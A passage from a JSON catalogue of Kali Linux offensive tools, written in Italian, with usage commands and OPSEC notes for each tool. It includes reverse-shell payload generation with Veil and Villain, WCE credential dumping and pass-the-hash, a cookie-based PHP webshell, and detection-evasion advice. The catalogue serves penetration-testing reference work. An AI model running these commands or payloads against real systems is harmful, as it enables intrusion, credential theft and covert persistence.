detection personalizzati\nrepocrazy --repo http://repo.example.com --patterns custom_patterns.txt\n\n# Limitare analisi a pacchetti modificati recentemente\nrepocrazy --repo http://repo.example.com --since 2024-01-01</code></pre><p>L'analisi di repository di grandi dimensioni (come l'archivio ufficiale Ubuntu) puo richiedere tempo e spazio disco significativi. E consigliabile utilizzare i filtri per sezione e pacchetto per limitare lo scope dell'analisi in base agli obiettivi dell'assessment.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security research sulla supply chain</strong>, Repocrazy viene utilizzato per analizzare repository pubblici alla ricerca di secrets che potrebbero essere sfruttati per accedere a infrastrutture degli sviluppatori o a servizi backend utilizzati dai pacchetti. Credenziali AWS o database connection string trovate in pacchetti pubblici possono fornire accesso a risorse cloud dell'organizzazione che ha pubblicato il pacchetto. In contesti di <strong>audit di sicurezza aziendale</strong>, lo strumento analizza i repository interni utilizzati per la distribuzione del software personalizzato, verificando che i pacchetti non contengano credenziali o informazioni sensibili che verrebbero distribuite a tutti i sistemi che installano il pacchetto. Per programmi di <strong>bug bounty</strong>, l'analisi dei repository associati all'organizzazione target puo rivelare credenziali o endpoint interni non documentati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il download di pacchetti da repository pubblici tramite HTTPS e un'operazione normale che non genera alert. Tuttavia, il download massivo di un gran numero di pacchetti in rapida successione puo essere identificato come comportamento anomalo dai sistemi di monitoraggio del repository. Per repository privati, l'accesso viene loggato e puo essere correlato con l'identita dell'utente autenticato.</p><p><strong>Impatto operativo:</strong> L'analisi di repository di grandi dimensioni richiede banda significativa per il download e spazio disco per la decompressione temporanea dei pacchetti. Le credenziali trovate nei pacchetti possono essere ancora attive e richiedono validazione responsabile senza causare impatto sui servizi associati. I risultati contengono potenzialmente credenziali valide che devono essere gestite con misure di sicurezza appropriate.</p><p><strong>Mitigazioni:</strong> Eseguire il download da reti non correlabili con l'identita operativa per repository pubblici. Segnalare immediatamente al cliente o ai maintainer qualsiasi credenziale attiva trovata nei pacchetti, seguendo processi di responsible disclosure. Eliminare in modo sicuro i pacchetti scaricati e i file temporanei dopo l'analisi. Conservare i risultati contenenti credenziali in storage crittografato con accesso limitato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Metadata"
    ],
    "notes": null
  },
  {
    "id": "veil",
    "name": "veil",
    "version": "3.1.14",
    "icon": "../app/icons/veil-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/veil/",
    "desc": "Framework per generare payload con evasion AV: Python, PowerShell, C, Go.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Veil e un framework open-source progettato per generare payload con capacita di evasione degli antivirus. Il progetto supporta la generazione di payload in diversi linguaggi di programmazione tra cui Python, PowerShell, C, Go e Ruby. Veil si compone di due strumenti principali: Veil-Evasion per la generazione di payload offuscati e Veil-Ordnance per la creazione di shellcode. Lo scopo principale e quello di assistere i penetration tester nel valutare la robustezza delle soluzioni antivirus presenti nei sistemi target. Grazie alla sua architettura modulare, il framework consente di combinare tecniche di encoding, cifratura e offuscamento per produrre eseguibili difficili da rilevare.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Generazione payload multi-linguaggio:</strong> Veil supporta la creazione di payload in Python, PowerShell, C, Go, Ruby e C#. Ogni linguaggio offre vantaggi diversi in termini di evasione e compatibilita con il sistema target. I payload Python vengono compilati con PyInstaller o Py2Exe per produrre eseguibili standalone.</p><p><strong>Tecniche di evasione integrate:</strong> Il framework implementa numerose tecniche di offuscamento tra cui cifratura AES, encoding Base64, iniezione in processi legittimi e inserimento di codice spazzatura. Queste tecniche vengono combinate automaticamente per massimizzare la probabilita di bypassare le firme antivirus. E possibile personalizzare il livello di offuscamento per ogni payload generato.</p><p><strong>Veil-Ordnance per shellcode:</strong> Il modulo Ordnance genera shellcode personalizzato per reverse shell, bind shell e Meterpreter. Supporta la generazione di shellcode con encoder multipli per evitare bad characters. Lo shellcode generato puo essere integrato direttamente nei payload di Evasion o utilizzato in modo indipendente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Veil si avvia tramite interfaccia interattiva a menu oppure tramite parametri da linea di comando per automazione.</p><pre><code># Avvio interfaccia interattiva\nveil\n\n# Elenco payload disponibili\nveil --list-payloads\n\n# Generazione payload con parametri specifici\nveil -t Evasion -p go/meterpreter/rev_tcp.py --ip 192.168.1.100 --port 4444 -o payload_output\n\n# Generazione con Ordnance\nveil -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.100 --port 4444</code></pre><p>I payload generati vengono salvati nella directory di output configurata, pronti per essere trasferiti e eseguiti sul sistema target. E consigliabile testare ogni payload contro i principali motori antivirus prima dell'utilizzo in engagement reali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un penetration test, Veil viene utilizzato per generare payload che bypassano le soluzioni antivirus enterprise installate sui sistemi target, permettendo di ottenere una shell remota senza essere bloccati. In scenari di red teaming, i payload offuscati vengono distribuiti tramite campagne di phishing per valutare la capacita del blue team di rilevare eseguibili malevoli. Veil e inoltre utile per testare l'efficacia di soluzioni EDR e sandbox analizzando quali tecniche di evasione riescono a superare i controlli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molti payload generati da Veil sono ormai noti ai principali motori antivirus, che hanno aggiunto firme specifiche per i pattern di offuscamento del framework. L'esecuzione di Veil stesso puo generare alert se avviene su sistemi monitorati.</p><p><strong>Impatto operativo:</strong> I payload generati stabiliscono connessioni di rete verso il C2 che possono essere rilevate da IDS/IPS. L'uso di linguaggi come PowerShell puo attivare logging avanzato tramite ScriptBlock Logging e AMSI su sistemi Windows moderni.</p><p><strong>Mitigazioni:</strong> Utilizzare payload con comunicazioni cifrate e su porte standard (443/80). Personalizzare i template di offuscamento per evitare firme note. Testare i payload su ambienti simili al target con gli stessi antivirus prima dell'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "villain",
    "name": "villain",
    "version": "2.2.1",
    "icon": "../app/icons/villain-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/villain/",
    "desc": "Framework C2 Windows con agent multi-hop, evasion e gestione sessioni avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Villain e un framework Command and Control (C2) progettato per la gestione di sessioni remote su sistemi Windows e Linux. Il framework offre funzionalita di generazione di agent con capacita multi-hop, permettendo la creazione di catene di comunicazione attraverso host compromessi intermedi. Villain supporta agent in PowerShell per Windows e Bash per Linux, con comunicazione HTTP/HTTPS verso il server C2. L'interfaccia a linea di comando fornisce un ambiente integrato per gestire sessioni multiple, eseguire comandi e trasferire file. Il progetto e scritto in Python e si distingue per la semplicita di configurazione e la possibilita di condividere sessioni tra operatori.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Agent multi-hop:</strong> Villain supporta il concatenamento di agent attraverso host intermedi, creando tunnel di comunicazione che mascherano l'origine del traffico C2. Questa funzionalita permette di raggiungere segmenti di rete non direttamente accessibili. I sibling server consentono a piu operatori di condividere sessioni compromesse in tempo reale.</p><p><strong>Generazione payload automatica:</strong> Il framework genera automaticamente agent PowerShell e Bash con parametri configurabili per indirizzo, porta e intervallo di beacon. I payload possono essere offuscati per ridurre il rilevamento da parte di soluzioni antivirus. E possibile generare payload con cifratura della comunicazione e certificati personalizzati.</p><p><strong>Gestione sessioni avanzata:</strong> L'interfaccia CLI permette di gestire sessioni multiple contemporaneamente con alias personalizzati. Supporta upload e download di file, esecuzione di comandi con timeout configurabile e gestione dei risultati asincroni. Include funzionalita di auto-completamento e cronologia comandi per facilitare l'operativita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Villain si avvia come server C2 in ascolto e genera payload per i target da compromettere.</p><pre><code># Avvio del server C2\nvillain\n\n# Generazione payload PowerShell per Windows\ngenerate payload=windows/powershell/rev_tcp lhost=192.168.1.100 lport=8443\n\n# Elenco sessioni attive\nsessions\n\n# Interazione con sessione specifica\nshell SESSION_ID\n\n# Upload file su target\nupload /path/locale /path/remoto</code></pre><p>I payload generati vengono eseguiti sul target per stabilire la connessione al server C2. Le sessioni attive possono essere gestite attraverso l'interfaccia interattiva con comandi intuitivi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni di red teaming, Villain viene utilizzato come C2 leggero per gestire agent su sistemi Windows compromessi, sfruttando la funzionalita multi-hop per raggiungere segmenti di rete interni non esposti. Durante penetration test interni, il framework facilita la gestione di sessioni multiple su diversi target contemporaneamente, con possibilita di condivisione tra membri del team. Villain e utile anche per scenari di lateral movement dove il traffico C2 deve transitare attraverso host compromessi intermedi per evitare il rilevamento.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli agent PowerShell generati possono essere rilevati da AMSI e soluzioni EDR avanzate. Il traffico HTTP/HTTPS verso il server C2 puo essere identificato tramite analisi dei pattern di beaconing e anomalie nei certificati TLS.</p><p><strong>Impatto operativo:</strong> La compromissione del server C2 espone tutte le sessioni attive e i dati dei target. I payload multi-hop creano dipendenze tra host che possono causare perdita di accesso a catena.</p><p><strong>Mitigazioni:</strong> Utilizzare HTTPS con certificati validi e domain fronting per il traffico C2. Variare gli intervalli di beacon per evitare pattern regolari. Implementare separazione tra infrastruttura C2 di primo livello e redirector.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "voiphopper",
    "name": "voiphopper",
    "version": "2.04",
    "icon": "../app/icons/voiphopper-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/voiphopper/",
    "desc": "VLAN hopping su telefoni VoIP per accedere a VLAN voce da rete dati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>VoIPhopper</strong> è uno strumento per VLAN hopping che emula il comportamento di telefoni VoIP per ottenere accesso alla Voice VLAN da una rete dati standard. Sfrutta protocolli di discovery come CDP, DHCP e LLDP-MED per identificare e saltare nella VLAN voce isolata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CDP/LLDP Discovery:</strong> identifica automaticamente Voice VLAN tramite Cisco Discovery Protocol e LLDP-MED</p><p><strong>VLAN Tagging:</strong> configura interfaccia per 802.1Q tagging e accesso alla Voice VLAN</p><p><strong>Phone Emulation:</strong> impersona telefono VoIP per bypassare controlli di accesso basati su dispositivo</p><p><strong>Multi-vendor:</strong> supporta ambienti Cisco, Avaya, Nortel e altri vendor VoIP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scopri Voice VLAN via CDP e hop automatico\nvoiphopper -i eth0 -c -a\n\n# Hop manuale a VLAN 100 con MAC spoofing\nvoiphopper -i eth0 -v 100 -m 00:1E:7A:XX:XX:XX\n\n# Workflow completo: discovery + hop + scan\nvoiphopper -i eth0 -c -a &amp;&amp; \\\n  nmap -sV -p 5060,5061 --script=sip-enum-users 10.100.0.0/24\n\n# LLDP-MED per ambienti non-Cisco\nvoiphopper -i eth0 -l -a\n\n# Cattura traffico VoIP post-hop\nvoiphopper -i eth0 -v 100 &amp;&amp; \\\n  tcpdump -i eth0.100 -w voip_capture.pcap port 5060 or portrange 10000-20000</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Segmentation Testing</strong>, verificare isolamento tra VLAN dati e voce.</p><p>Per <strong>VoIP Security Assessment</strong>, testare protezioni contro accesso non autorizzato a infrastruttura voce.</p><p>Per <strong>Lateral Movement</strong>, accedere a reti VoIP isolate durante penetration test.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> CDP/LLDP discovery genera traffico anomalo rilevabile da network monitoring. Switch con port security e dynamic ARP inspection possono bloccare l'attacco. MAC address cloning di telefoni è tracciabile nei log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "wafw00f",
    "name": "wafw00f",
    "version": "2.3.1",
    "icon": "../app/icons/wafw00f-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wafw00f/",
    "desc": "Rileva WAF (Web Application Firewall) analizzando risposte HTTP e behavior.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WAFW00F</strong> è uno strumento di fingerprinting che identifica Web Application Firewall analizzando le risposte HTTP e i pattern comportamentali. Riconosce oltre 150 WAF diversi tramite signature delle risposte, codici di errore e header specifici dei vendor.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Detection:</strong> identifica 150+ WAF commerciali e open source tramite fingerprinting</p><p><strong>Aggressive Mode:</strong> modalità intensiva che invia payload malevoli per triggare risposte WAF</p><p><strong>Generic Detection:</strong> rileva WAF sconosciuti analizzando anomalie comportamentali</p><p><strong>Proxy Support:</strong> supporto per Tor e proxy HTTP per scansioni anonime</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Detection WAF con output JSON per automazione\nwafw00f https://target.com -o waf_results.json -f json\n\n# Scansione aggressiva via proxy Burp\nwafw00f -a https://target.com -p http://127.0.0.1:8080\n\n# Scansione bulk da lista target\ncat targets.txt | while read url; do wafw00f \"$url\" -o \"waf_$(echo $url | md5sum | cut -d' ' -f1).json\" -f json; done\n\n# Pipeline con nuclei per testare bypass\nwafw00f https://target.com -v &amp;&amp; \\\n  nuclei -u https://target.com -t waf-bypass/ -proxy http://127.0.0.1:8080\n\n# Custom User-Agent per evasione\nwafw00f https://target.com -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pre-Engagement Recon</strong>, identificare protezioni WAF prima di testare applicazioni web.</p><p>Per <strong>Bypass Strategy</strong>, selezionare tecniche di evasione appropriate al WAF rilevato.</p><p>Per <strong>Security Assessment</strong>, verificare corretta implementazione e visibilità WAF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> request anomale per fingerprinting sono loggate dai WAF. Modalità aggressiva genera alert immediati. User-Agent wafw00f è signature nota. Usare proxy e randomizzare timing per ridurre fingerprint.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "wapiti",
    "name": "wapiti",
    "version": "3.0.4",
    "icon": "../app/icons/wapiti-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wapiti/",
    "desc": "Scanner black-box per vulnerabilità web: XSS, SQLi, XXE, SSRF con crawling.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wapiti</strong> è uno scanner di vulnerabilità web black-box che analizza applicazioni tramite crawling automatico e injection di payload malevoli. Rileva XSS, SQL injection, XXE, SSRF, command injection, CRLF, path traversal e molte altre vulnerabilità senza accesso al codice sorgente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Vulnerability Classes:</strong> rileva 15+ classi di vulnerabilità web incluse OWASP Top 10</p><p><strong>Smart Crawling:</strong> spider intelligente con gestione form, JavaScript e autenticazione</p><p><strong>Module System:</strong> moduli specializzati per ogni tipo di vulnerabilità attivabili selettivamente</p><p><strong>Report Generation:</strong> report HTML, JSON, XML con dettagli su vulnerabilità trovate</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione completa con report HTML e scope limitato\nwapiti -u https://target.com -f html -o report.html --max-scan-time 3600\n\n# Autenticazione bearer token per API\nwapiti -u https://api.target.com -H \"Authorization: Bearer eyJhbG...\" -m sql,xxe,ssrf\n\n# Scansione con cookie di sessione (post-login)\nwapiti -u https://target.com -c \"PHPSESSID=abc123; auth=xyz789\" --scope folder\n\n# Escludere logout e profilo, profondità limitata\nwapiti -u https://target.com -x \"logout|signout|profile|account\" -d 3 --max-links 500\n\n# Pipeline CI/CD con threshold di vulnerabilità\nwapiti -u https://staging.target.com -f json -o results.json &amp;&amp; \\\n  jq '.vulnerabilities | length' results.json | \\\n  xargs -I {} sh -c '[ {} -gt 0 ] &amp;&amp; exit 1 || exit 0'\n\n# Proxy attraverso Burp per analisi manuale\nwapiti -u https://target.com -p http://127.0.0.1:8080 --verify-ssl 0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Security Assessment</strong>, scansione automatizzata di applicazioni web per vulnerabilità note.</p><p>Per <strong>Compliance Testing</strong>, verifica OWASP Top 10 e requisiti di sicurezza.</p><p>Per <strong>CI/CD Integration</strong>, scanning automatico in pipeline di deployment.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> genera traffico anomalo con pattern di attacco riconoscibili. WAF e IDS rilevano facilmente injection attempts. Molte request possono causare rate limiting. Usare scope limitato e throttling per ridurre impatto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "waybackpy",
    "name": "waybackpy",
    "version": "3.0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/waybackpy/",
    "desc": "Client Python Wayback Machine per recuperare snapshot storici di siti web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Waybackpy e un client Python per interagire con le API della Wayback Machine di Internet Archive. Lo strumento permette di recuperare snapshot storici di pagine web, verificare la disponibilita di URL archiviati e salvare nuove pagine nell'archivio. Waybackpy offre sia un'interfaccia a linea di comando che una libreria Python importabile per l'integrazione in script personalizzati. Nel contesto OSINT, rappresenta un mezzo fondamentale per accedere a versioni precedenti di siti web che potrebbero contenere informazioni rimosse o modificate. Lo strumento supporta la ricerca per data specifica, il recupero dello snapshot piu vicino a una data target e la navigazione nella cronologia completa di un URL.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Recupero snapshot storici:</strong> Waybackpy consente di ottenere la versione archiviata di qualsiasi URL indicizzato dalla Wayback Machine, specificando date precise o intervalli temporali. Lo strumento restituisce l'URL dell'archivio e il contenuto della pagina come era al momento della cattura. E possibile recuperare lo snapshot piu vecchio, piu recente o piu vicino a una data specificata.</p><p><strong>Salvataggio di nuove pagine:</strong> Il tool permette di salvare snapshot di pagine web attualmente online nell'archivio di Internet Archive. Questa funzionalita e utile per preservare evidenze digitali prima che vengano modificate o rimosse. Il salvataggio avviene tramite le API ufficiali di Wayback Machine con conferma dell'avvenuta archiviazione.</p><p><strong>Integrazione programmatica:</strong> Come libreria Python, waybackpy puo essere importata in script per automatizzare ricerche OSINT su larga scala. Supporta la ricerca di tutti gli snapshot disponibili per un dominio con filtri per tipo MIME, codice di stato e timestamp. L'API e ben documentata e permette di costruire workflow di intelligence personalizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Waybackpy si utilizza sia come comando CLI che come libreria Python per interrogare la Wayback Machine.</p><pre><code># Ottenere lo snapshot piu recente di un URL\nwaybackpy --url \"https://example.com\" --newest\n\n# Ottenere lo snapshot piu vicino a una data\nwaybackpy --url \"https://example.com\" --near --year 2020 --month 6\n\n# Salvare una pagina nell'archivio\nwaybackpy --url \"https://example.com\" --save\n\n# Uso come libreria Python\npython3 -c \"from waybackpy import WaybackMachineCDXServerAPI; cdx = WaybackMachineCDXServerAPI('https://example.com'); for snap in cdx.snapshots(): print(snap.archive_url)\"</code></pre><p>Lo strumento richiede connessione internet per accedere alle API di Internet Archive. Le query su domini molto popolari possono restituire migliaia di risultati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante indagini OSINT, waybackpy viene utilizzato per recuperare versioni precedenti di siti web target che potrebbero contenere informazioni sensibili successivamente rimosse, come pagine di contatto, documenti interni o configurazioni esposte. In attivita di ricognizione, lo strumento permette di analizzare l'evoluzione di un'infrastruttura web nel tempo, identificando tecnologie dismesse, sottodomini storici e percorsi URL non piu attivi. Per la digital forensics, waybackpy consente di preservare e documentare lo stato di pagine web come evidenza, creando snapshot verificabili con timestamp dell'archivio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query alla Wayback Machine non generano traffico verso il sito target originale, poiche accedono solo all'archivio di Internet Archive. Tuttavia, il salvataggio di nuove pagine tramite la funzione save puo generare una richiesta al sito target dall'IP di Internet Archive.</p><p><strong>Impatto operativo:</strong> Le informazioni recuperate potrebbero essere obsolete o incomplete, richiedendo validazione incrociata. L'API ha limiti di rate che possono rallentare ricerche massive su molti URL.</p><p><strong>Mitigazioni:</strong> Utilizzare una VPN per mascherare l'origine delle query all'API di Internet Archive. Evitare la funzione save durante operazioni covert per non generare richieste al target. Verificare sempre l'attualita delle informazioni recuperate dagli snapshot storici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "URL_Archive"
    ],
    "notes": null
  },
  {
    "id": "wce",
    "name": "wce",
    "version": "1.42",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wce/",
    "desc": "Windows Credentials Editor: dump hash, pass-the-hash, token impersonation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WCE</strong> (Windows Credentials Editor) è uno strumento per manipolare credenziali Windows in memoria. Permette di estrarre hash NTLM, eseguire pass-the-hash, listare sessioni logon e impersonare token di sicurezza per privilege escalation e lateral movement.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Hash Dump:</strong> estrae hash NTLM e password in chiaro dalla memoria LSASS</p><p><strong>Pass-the-Hash:</strong> autentica con hash NTLM senza conoscere la password</p><p><strong>Token Manipulation:</strong> lista e impersona token di sicurezza di altri utenti</p><p><strong>Session Listing:</strong> enumera sessioni logon attive con dettagli credenziali</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump credenziali con WDigest cleartext\nwce.exe -w -v\n\n# Pass-the-Hash per aprire cmd come altro utente\nwce.exe -s Administrator:DOMAIN:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\ncmd.exe /c \"whoami &amp;&amp; net user\"\n\n# Refresh credenziali in sessione corrente\nwce.exe -r\n\n# Dump e salvataggio per cracking offline\nwce.exe -l -o creds_dump.txt\nhashcat -m 1000 creds_dump.txt rockyou.txt\n\n# Lista token e impersona SYSTEM\nwce.exe -e\nwce.exe -i -s NT AUTHORITY\\SYSTEM\n\n# PTH per PsExec remoto\nwce.exe -s admin:CORP:hash:hash &amp;&amp; \\\n  psexec.exe \\\\targetpc cmd.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Credential Harvesting</strong>, estrarre credenziali da sistemi compromessi.</p><p>Per <strong>Lateral Movement</strong>, usare hash per accedere ad altri sistemi nel dominio.</p><p>Per <strong>Privilege Escalation</strong>, impersonare token di utenti privilegiati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> accesso a LSASS è monitorato da EDR e genera eventi Sysmon. WCE è signature nota per tutti gli antivirus. NTLM pass-the-hash lascia tracce nei log di sicurezza. Preferire alternative moderne come Mimikatz con offuscamento.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "web-cache-vulnerability-scanner",
    "name": "web-cache-vulnerability-scanner",
    "version": "1.4.3",
    "icon": "../app/icons/web-cache-vulnerability-scanner-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/web-cache-vulnerability-scanner/",
    "desc": "Rileva vulnerabilità web cache poisoning e deception per attacchi su CDN e proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Web Cache Vulnerability Scanner e uno strumento specializzato nel rilevamento di vulnerabilita legate al caching web, tra cui web cache poisoning e web cache deception. Lo scanner analizza le configurazioni di cache di CDN, reverse proxy e server web per identificare header e parametri che possono essere manipolati per avvelenare la cache. Lo strumento implementa test automatizzati per verificare se risposte malevole possono essere memorizzate in cache e servite ad altri utenti. Il web cache poisoning rappresenta una classe di attacchi particolarmente pericolosa poiche consente di distribuire contenuto malevolo attraverso infrastrutture di caching legittime. Lo scanner supporta la verifica di molteplici vettori di attacco tra cui header non standardizzati, parametri non chiave e variazioni di path.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Rilevamento cache poisoning:</strong> Lo scanner testa sistematicamente header HTTP non convenzionali come X-Forwarded-Host, X-Original-URL, X-Rewrite-URL e altri per verificare se vengono riflessi nelle risposte cached. Ogni test include una fase di verifica per confermare che la risposta avvelenata sia effettivamente stata memorizzata in cache. I risultati includono dettagli su quale header o parametro e sfruttabile e con quale impatto.</p><p><strong>Web cache deception:</strong> Il tool verifica vulnerabilita di cache deception dove un attaccante puo forzare la cache a memorizzare risposte contenenti dati privati di altri utenti. Testa variazioni di path come /account/profile.css o /api/data.js per verificare se la cache tratta erroneamente risposte dinamiche come statiche. Questa classe di vulnerabilita puo esporre sessioni, token e dati personali.</p><p><strong>Supporto multi-piattaforma:</strong> Lo scanner e configurato per testare le principali piattaforme di caching tra cui Cloudflare, Akamai, Fastly, Varnish e NGINX. Include profili specifici per ogni piattaforma che tengono conto delle peculiarita nella gestione della cache. Supporta autenticazione, cookie personalizzati e header custom per testare applicazioni autenticate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo scanner si utilizza da linea di comando specificando il target e le opzioni di test desiderate.</p><pre><code># Scansione base per cache poisoning\nweb-cache-vulnerability-scanner -u https://example.com\n\n# Scansione con wordlist di header personalizzata\nweb-cache-vulnerability-scanner -u https://example.com -w headers.txt\n\n# Test specifico per cache deception\nweb-cache-vulnerability-scanner -u https://example.com --deception\n\n# Scansione con autenticazione\nweb-cache-vulnerability-scanner -u https://example.com -H \"Cookie: session=abc123\"</code></pre><p>Lo scanner genera un report dettagliato con i vettori di attacco identificati, la gravita e le raccomandazioni per la remediation. E consigliabile eseguire i test in orari di basso traffico per minimizzare l'impatto sulla cache.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un assessment di applicazioni web dietro CDN, lo scanner identifica header non gestiti correttamente che permettono di avvelenare la cache e servire contenuto malevolo (come redirect a siti di phishing) a tutti gli utenti che richiedono la stessa risorsa. In test su applicazioni con profili utente, lo strumento verifica se e possibile sfruttare web cache deception per forzare la memorizzazione in cache di pagine contenenti dati privati di altri utenti. Lo scanner viene anche utilizzato in programmi di bug bounty per identificare vulnerabilita di cache poisoning su target con infrastrutture di caching complesse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I test di cache poisoning generano richieste con header anomali che possono essere facilmente identificati da WAF e sistemi di monitoraggio. Le verifiche di avvelenamento richiedono richieste multiple allo stesso URL che possono generare pattern sospetti.</p><p><strong>Impatto operativo:</strong> Un test di cache poisoning riuscito puo effettivamente avvelenare la cache in produzione, servendo contenuto modificato a utenti reali. Questo rende lo strumento potenzialmente distruttivo se utilizzato senza precauzioni su ambienti di produzione.</p><p><strong>Mitigazioni:</strong> Eseguire i test esclusivamente su ambienti di staging o con cache buster per evitare impatti su utenti reali. Coordinare con il team del target per invalidare la cache dopo i test. Utilizzare token unici nelle richieste di test per facilitarne l'identificazione nei log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "webacoo",
    "name": "webacoo",
    "version": "0.2.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/webacoo/",
    "desc": "Web backdoor cookie-based per comunicazione stealth con webshell via cookie HTTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WeBaCoo (Web Backdoor Cookie) e uno strumento per la creazione e gestione di web backdoor che utilizzano cookie HTTP come canale di comunicazione. A differenza delle webshell tradizionali che trasmettono comandi e risultati tramite parametri GET/POST visibili, WeBaCoo codifica la comunicazione nei valori dei cookie, rendendo il traffico molto piu difficile da rilevare. Lo strumento genera uno script PHP minimale da caricare sul server web target, che funge da endpoint per la comunicazione steganografica via cookie. WeBaCoo include sia il generatore di backdoor che il client per la gestione interattiva della sessione. Il protocollo di comunicazione utilizza encoding Base64 con delimitatori personalizzabili per offrire un livello base di offuscamento.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Comunicazione cookie-based:</strong> WeBaCoo codifica comandi e risposte all'interno dei valori dei cookie HTTP, sfruttando un canale di comunicazione che raramente viene ispezionato da WAF e IDS. I cookie utilizzati hanno nomi che imitano cookie di sessione legittimi per mimetizzarsi nel traffico normale. Il payload e codificato in Base64 con delimitatori configurabili per evitare pattern detection.</p><p><strong>Generazione backdoor offuscata:</strong> Lo strumento genera uno script PHP compatto e offuscato che puo essere inserito in file esistenti o caricato come file indipendente. La backdoor supporta funzioni di offuscamento come la codifica multistrato e la randomizzazione dei nomi delle variabili. Le dimensioni ridotte del codice facilitano l'inserimento in file PHP legittimi senza destare sospetti.</p><p><strong>Client interattivo:</strong> WeBaCoo include un client a terminale che fornisce un'interfaccia shell-like per 